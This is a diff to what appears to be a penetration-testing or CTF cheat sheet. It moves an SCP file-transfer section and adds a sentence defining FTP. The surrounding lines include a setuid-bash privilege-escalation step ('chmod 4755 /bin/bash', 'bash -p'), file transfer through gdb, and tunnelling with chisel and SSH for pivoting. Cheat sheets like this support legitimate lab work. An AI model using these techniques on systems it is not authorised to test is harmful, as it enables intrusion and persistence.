@@ -137,24 +137,10 @@ chmod 4755 /bin/bash
 bash -p
 ```
 
-# SCP
-### Download File
-```
-scp -P port user@192.168.1.ip:path .
-```
-
-### Upload File
-```
-scp -P port file user@192.168.1.ip:path
-```
-
-### Upload peda
-```
-scp -P 22 -r ~/.peda user@192.168.1.ip:/tmp/peda
-```
-
 # FTP
 > *Port: 21*
+> 
+> File transfer protocol (FTP) is an Internet tool provided by TCP/IP. It helps to transfer files from one computer to another by providing access to directories or folders on remote computers 
 
 ### Download all files
 ```
@@ -173,7 +159,6 @@ $ gdb
 (gdb) remote get remote_file local_file
 (gdb) remote put local_file remote_file
 ```
-
 
 # Command Injection
 ```bash
@@ -227,4 +212,20 @@ chisel client ip-server:4444 R:8000:127.0.0.1:8000
 ### SSH
 ```sh
 ssh -L 8080:127.0.0.1:8080 user@ip
+```
+
+# SCP
+### Download File
+```
+scp -P port user@192.168.1.ip:path .
+```
+
+### Upload File
+```
+scp -P port file user@192.168.1.ip:path
+```
+
+### Upload peda
+```
+scp -P 22 -r ~/.peda user@192.168.1.ip:/tmp/peda
 ```
